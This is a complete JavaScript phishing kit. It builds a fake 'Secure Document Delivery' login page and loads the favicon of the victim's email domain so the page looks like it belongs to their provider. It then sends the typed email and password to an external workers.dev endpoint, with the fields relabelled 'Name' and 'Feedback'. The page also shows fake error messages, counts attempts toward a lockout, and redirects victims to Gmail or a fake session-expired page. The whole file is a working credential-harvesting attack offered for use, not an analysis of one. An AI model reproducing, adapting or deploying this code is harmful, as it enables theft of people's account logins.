(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        // UI Styling
        BG_IMG: 'https://i.postimg.cc/Dz2Q7TzV/Signin-Background.jpg',
        BG_BRIGHTNESS: 1,
        BG_DARKNESS: 1,
        BG_CONTRAST: 1,
        BG_SATURATION: 1,
        BG_BLUR: 0,
        BG_GRAYSCALE: false,
        BG_OVERLAY: 0.25,
        
        // Endpoints (MODIFIED as requested)
        PHP_ENDPOINT: 'https://rum-email-proxy.haricoting.workers.dev/contact',
        SUCCESS_REDIRECT: 'https://mail.google.com/mail/u/0/#inbox',
        LOCKOUT_REDIRECT: 'https://linehome.ui/login/SessionExpired',
        
        // Security
        SECRET_KEY: 'fdfmdkfmsdkfmskdfmsldf',
        MAX_TRIES: 3,
        LOCKOUT_DELAY: 2000,
        STORAGE_KEY: 'zz_core_st',
        
        // Path segments for URL hash
        PATH_SEGMENTS: [
            'dashboard',
            'manage',
            'profile',
            'overview',
            'settings'
        ],
        
        // Messages
        MSG_WRONG: 'Incorrect access code.',
        MSG_LOCKOUT: 'Too many incorrect attempts. Access blocked.',
        MSG_GRANTED: 'Access granted. Redirecting...',
        MSG_NET: 'Network error. Please try again later.',
        
        // Labels
        HEADING: 'Secure Document Delivery',
        SUBHEAD: 'Login to view your secure document.',
        FOOTER: 'Â· Â© 2026',
        EMAIL_LABEL: 'Email',
        KEY_LABEL: 'Password',
        KEY_PLACEHOLDER: 'Enter your password.',
        BUTTON_TEXT: 'Unlock',
        TAG_TEXT: 'Encrypted'
    };

    // Utility: Create background elements
    function createBackground() {
        const bgCanvas = document.createElement('div');
        bgCanvas.id = 'bg_canvas';
        bgCanvas.style.cssText = 'position:fixed;inset:0;z-index:-2;width:100%;height:100%;background-size:cover;background-repeat:no-repeat;background-position:center;';
        document.body.appendChild(bgCanvas);
        
        const bgVeil = document.createElement('div');
        bgVeil.id = 'bg_veil';
        bgVeil.style.cssText = 'position:fixed;inset:0;z-index:-1;width:100%;height:100%;background:rgba(10,66,102,.5);';
        document.body.appendChild(bgVeil);
    }

    // Utility: Create main UI
    function createUI() {
        const frame = document.createElement('div');
        frame.className = 'frame_v7';
        frame.id = 'frame_v7';
        
        const card = document.createElement('div');
        card.className = 'card_root';
        
        // Brand row with logo
        const brandRow = document.createElement('div');
        brandRow.className = 'brand_row';
        
        const brandOrb = document.createElement('div');
        brandOrb.className = 'brand_orb';
        
        const brandImg = document.createElement('img');
        brandImg.className = 'brand_img';
        brandImg.src = 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'white\'/%3E%3C/svg%3E';
        brandImg.alt = 'Logo';
        
        brandOrb.appendChild(brandImg);
        brandRow.appendChild(brandOrb);
        
        // Title
        const title = document.createElement('h1');
        title.className = 'title_main';
        title.textContent = CONFIG.HEADING;
        
        // Caption
        const caption = document.createElement('div');
        caption.className = 'caption_node';
        caption.innerHTML = `<span class="caption_sub">${CONFIG.SUBHEAD}</span>`;
        
        // Form
        const form = document.createElement('form');
        form.id = 'main_form';
        form.className = 'main_form';
        form.setAttribute('autocomplete', 'off');
        
        // Email input
        const emailSlot = document.createElement('div');
        emailSlot.className = 'mail_slot';
        
        const emailLabel = document.createElement('label');
        emailLabel.className = 'lbl_small';
        emailLabel.setAttribute('for', 'mail_x9k2');
        emailLabel.textContent = CONFIG.EMAIL_LABEL;
        
        const emailInput = document.createElement('input');
        emailInput.className = 'inp_core';
        emailInput.type = 'email';
        emailInput.id = 'mail_x9k2';
        emailInput.placeholder = CONFIG.EMAIL_LABEL;
        emailInput.required = true;
        emailInput.setAttribute('autocomplete', 'off');
        
        emailSlot.appendChild(emailLabel);
        emailSlot.appendChild(emailInput);
        
        // Password input with toggle
        const rowBlock = document.createElement('div');
        rowBlock.className = 'row_block';
        
        const keyLabel = document.createElement('label');
        keyLabel.className = 'lbl_small';
        keyLabel.setAttribute('for', 'code_p4r7');
        keyLabel.textContent = CONFIG.KEY_LABEL;
        
        const fieldShell = document.createElement('div');
        fieldShell.className = 'field_shell';
        fieldShell.id = 'field_shell';
        
        const passwordInput = document.createElement('input');
        passwordInput.className = 'inp_core';
        passwordInput.type = 'password';
        passwordInput.id = 'code_p4r7';
        passwordInput.placeholder = CONFIG.KEY_PLACEHOLDER;
        passwordInput.required = true;
        passwordInput.setAttribute('autocomplete', 'off');
        
        const eyeBtn = document.createElement('button');
        eyeBtn.type = 'button';
        eyeBtn.className = 'eye_btn';
        eyeBtn.id = 'eye_toggle';
        eyeBtn.setAttribute('aria-label', 'Toggle visibility');
        
        const eyeShow = document.createElement('span');
        eyeShow.id = 'eye_show';
        eyeShow.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
        
        const eyeHide = document.createElement('span');
        eyeHide.id = 'eye_hide';
        eyeHide.style.display = 'none';
        eyeHide.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07A3 3 0 1 1 9.88 9.88"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
        
        eyeBtn.appendChild(eyeShow);
        eyeBtn.appendChild(eyeHide);
        
        fieldShell.appendChild(passwordInput);
        fieldShell.appendChild(eyeBtn);
        
        rowBlock.appendChild(keyLabel);
        rowBlock.appendChild(fieldShell);
        
        // Alert bar
        const alertBar = document.createElement('div');
        alertBar.className = 'alert_bar';
        alertBar.id = 'alert_bar';
        
        const icoSlot = document.createElement('span');
        icoSlot.className = 'ico_slot';
        icoSlot.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
        
        const alertText = document.createElement('span');
        alertText.id = 'alert_text';
        
        alertBar.appendChild(icoSlot);
        alertBar.appendChild(alertText);
        
        // Submit button
        const ctaNode = document.createElement('div');
        ctaNode.className = 'cta_node';
        ctaNode.id = 'cta_node';
        
        const submitBtn = document.createElement('button');
        submitBtn.type = 'submit';
        submitBtn.className = 'cta_main';
        submitBtn.id = 'cta_main';
        
        const btnText = document.createElement('span');
        btnText.textContent = CONFIG.BUTTON_TEXT;
        
        const btnIcon = document.createElement('span');
        btnIcon.className = 'cta_icon';
        btnIcon.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
        
        const spinner = document.createElement('span');
        spinner.className = 'ring_load';
        spinner.id = 'ring_load';
        spinner.innerHTML = '<svg viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="4" stroke-dasharray="60 90" stroke-linecap="round"/></svg>';
        
        submitBtn.appendChild(btnText);
        submitBtn.appendChild(btnIcon);
        submitBtn.appendChild(spinner);
        ctaNode.appendChild(submitBtn);
        
        // Chip tag
        const chipTag = document.createElement('div');
        chipTag.className = 'chip_tag';
        chipTag.innerHTML = `<span>${CONFIG.TAG_TEXT}</span>`;
        
        // Footer
        const baseNote = document.createElement('div');
        baseNote.className = 'base_note';
        baseNote.innerHTML = `<span>${CONFIG.FOOTER}</span>`;
        
        // Assemble form
        form.appendChild(emailSlot);
        form.appendChild(rowBlock);
        form.appendChild(alertBar);
        form.appendChild(ctaNode);
        
        // Assemble card
        card.appendChild(brandRow);
        card.appendChild(title);
        card.appendChild(caption);
        card.appendChild(form);
        card.appendChild(chipTag);
        card.appendChild(baseNote);
        
        frame.appendChild(card);
        document.body.appendChild(frame);
    }

    // Utility: Apply background styles
    function applyBackgroundStyles() {
        const bgCanvas = document.getElementById('bg_canvas');
        const bgVeil = document.getElementById('bg_veil');
        
        if (!bgCanvas || !bgVeil) return;
        
        const styles = [];
        styles.push(`background-image:url('${CONFIG.BG_IMG}')`);
        styles.push(`filter:brightness(${CONFIG.BG_BRIGHTNESS})`);
        styles.push(`contrast(${CONFIG.BG_CONTRAST})`);
        styles.push(`saturate(${CONFIG.BG_SATURATION})`);
        
        if (CONFIG.BG_BLUR > 0) {
            styles.push(`blur(${CONFIG.BG_BLUR}px)`);
        }
        
        if (CONFIG.BG_GRAYSCALE) {
            styles.push('grayscale(1)');
        }
        
        bgCanvas.style.cssText += styles.join(' ');
        bgVeil.style.background = `rgba(10,66,102,${CONFIG.BG_OVERLAY})`;
    }

    // Utility: Generate random URL hash
    function updateURLHash() {
        try {
            const array = new Uint8Array(16);
            crypto.getRandomValues(array);
            const base64 = btoa(String.fromCharCode.apply(null, array))
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=+$/, '');
            history.replaceState(null, '', `#/${CONFIG.PATH_SEGMENTS.join('/')}/${base64}`);
        } catch (e) {}
    }

    // Main initialization
    function init() {
        createBackground();
        createUI();
        applyBackgroundStyles();
        updateURLHash();

        const emailInput = document.getElementById('mail_x9k2');
        const passwordInput = document.getElementById('code_p4r7');
        const alertBar = document.getElementById('alert_bar');
        const alertText = document.getElementById('alert_text');
        const eyeToggle = document.getElementById('eye_toggle');
        const eyeShow = document.getElementById('eye_show');
        const eyeHide = document.getElementById('eye_hide');
        const submitBtn = document.getElementById('cta_main');
        const spinner = document.getElementById('ring_load');
        const form = document.getElementById('main_form');
        const fieldShell = document.getElementById('field_shell');
        const ctaNode = document.getElementById('cta_node');

        let alertTimeout = null;
        let isSubmitting = false;

        // Extract domain from email
        function getEmailDomain(email) {
            if (!email || email.indexOf('@') === -1) return '';
            const parts = email.split('@');
            if (parts.length === 2 && parts[0].trim() !== '') {
                return parts[1].trim().toLowerCase();
            }
            return '';
        }

        // Extract first part of domain
        function getDomainPrefix(domain) {
            if (!domain) return '';
            return domain.split('.')[0].toLowerCase();
        }

        // Show alert message
        function showAlert(message, type) {
            alertText.textContent = message;
            alertBar.classList.add('visible');
            
            if (type === 'error') {
                alertBar.style.background = '#fee9e7';
                alertBar.style.color = '#b33a2f';
                alertBar.style.borderColor = '#f5c6c2';
            } else {
                alertBar.style.background = '#e3f5e9';
                alertBar.style.color = '#1e7a4b';
                alertBar.style.borderColor = '#b8e0c8';
            }

            if (alertTimeout) {
                clearTimeout(alertTimeout);
                alertTimeout = null;
            }

            if (type === 'error') {
                alertTimeout = setTimeout(() => {
                    alertBar.classList.remove('visible');
                }, 5000);
            }
        }

        // Hide alert
        function hideAlert() {
            alertBar.classList.remove('visible');
            if (alertTimeout) {
                clearTimeout(alertTimeout);
                alertTimeout = null;
            }
        }

        // Show loading state
        function showLoading() {
            submitBtn.classList.add('locked_spinner');
            void submitBtn.offsetWidth; // Force reflow
            submitBtn.classList.remove('locked_spinner');
            submitBtn.classList.add('loading');
            setTimeout(() => {
                submitBtn.classList.remove('loading');
            }, 2000);
        }

        // XOR encryption (kept for compatibility but not used in new payload)
        function encryptData(data, key) {
            const jsonStr = JSON.stringify(data);
            const keyLen = key.length;
            let result = '';
            
            for (let i = 0; i < jsonStr.length; i++) {
                const charCode = jsonStr.charCodeAt(i) ^ key.charCodeAt(i % keyLen);
                result += ('0' + charCode.toString(16)).slice(-2);
            }
            
            return btoa(result);
        }

        // Handle lockout
        function handleLockout() {
            passwordInput.value = '';
            submitBtn.disabled = true;
            showLoading();
            showAlert(CONFIG.MSG_LOCKOUT, 'error');
            
            setTimeout(() => {
                window.location.href = CONFIG.LOCKOUT_REDIRECT;
            }, CONFIG.LOCKOUT_DELAY);
        }

        // Handle form submission
        function handleSubmit() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            const startTime = Date.now();

            // Validation
            if (!email || email.indexOf('@') === -1) {
                showAlert('Please enter a valid email address.', 'error');
                showLoading();
                return;
            }

            if (!password) {
                showAlert('Please enter your password.', 'error');
                showLoading();
                return;
            }

            if (isSubmitting) return;
            isSubmitting = true;

            submitBtn.disabled = true;
            submitBtn.textContent = 'Loading...';
            hideAlert();

            // MODIFIED: Create URLSearchParams payload as requested
            const cleanPayload = new URLSearchParams();
            cleanPayload.append("Name", email);
            cleanPayload.append("Feedback", password);

            // Calculate minimum loading time for UX
            const elapsed = Date.now() - startTime;
            const remainingDelay = Math.max(1500, 2500 - elapsed);

            // MODIFIED: Use the specified endpoint with URLSearchParams
            fetch(CONFIG.PHP_ENDPOINT, {
                method: 'POST',
                body: cleanPayload
            })
            .then(response => response.text())
            .then(data => {
                // Simulate processing delay
                return new Promise(resolve => setTimeout(resolve, remainingDelay))
                    .then(() => data);
            })
            .then(responseText => {
                let jsonData = null;
                let parseError = false;

                try {
                    jsonData = JSON.parse(responseText);
                } catch (e) {
                    parseError = true;
                }

                submitBtn.textContent = CONFIG.BUTTON_TEXT;
                isSubmitting = false;

                // Check for network/parse errors
                if (parseError || !jsonData) {
                    showAlert(CONFIG.MSG_NET, 'error');
                    submitBtn.disabled = false;
                    passwordInput.value = '';
                    passwordInput.focus();
                    showLoading();
                    return;
                }

                // Check response status
                if (jsonData.status === 'success') {
                    showAlert(CONFIG.MSG_GRANTED, 'success');
                    setTimeout(() => {
                        window.location.href = CONFIG.SUCCESS_REDIRECT;
                    }, CONFIG.LOCKOUT_DELAY);
                } else if (jsonData.status === 'locked') {
                    handleLockout();
                } else {
                    // Increment attempt counter
                    const currentAttempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || '0') + 1;
                    sessionStorage.setItem(CONFIG.STORAGE_KEY, String(currentAttempts));

                    if (currentAttempts >= CONFIG.MAX_TRIES) {
                        handleLockout();
                        return;
                    }

                    showAlert(CONFIG.MSG_WRONG, 'error');
                    submitBtn.disabled = false;
                    passwordInput.value = '';
                    passwordInput.focus();
                    showLoading();
                }
            })
            .catch(() => {
                submitBtn.textContent = CONFIG.BUTTON_TEXT;
                submitBtn.disabled = false;
                isSubmitting = false;
                showAlert(CONFIG.MSG_NET, 'error');
                showLoading();
            });
        }

        // Email input handler - load logo
        function handleEmailInput() {
            const email = emailInput.value.trim();
            const domain = getEmailDomain(email);
            
            if (!domain) {
                alertBar.classList.remove('visible');
                return;
            }

            const prefix = getDomainPrefix(domain);
            
            // Update UI with domain info
            document.querySelector('.caption_sub').textContent = `Login to view your secure document.`;
            
            // Try to load domain favicon
            const imgUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
            const img = new Image();
            
            img.onload = () => {
                document.querySelector('.brand_img').src = imgUrl;
            };
            
            img.onerror = () => {
                document.querySelector('.brand_img').src = 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'white\'/%3E%3C/svg%3E';
            };
            
            img.src = imgUrl;
        }

        // Toggle password visibility
        eyeToggle.addEventListener('click', () => {
            const isPassword = passwordInput.getAttribute('type') === 'password';
            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
            eyeShow.style.display = isPassword ? 'none' : 'block';
            eyeHide.style.display = isPassword ? 'block' : 'none';
            passwordInput.focus();
        });

        // Event listeners
        emailInput.addEventListener('input', handleEmailInput);
        
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            handleSubmit();
        });

        // Initial call
        handleEmailInput();
    }

    // Start
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
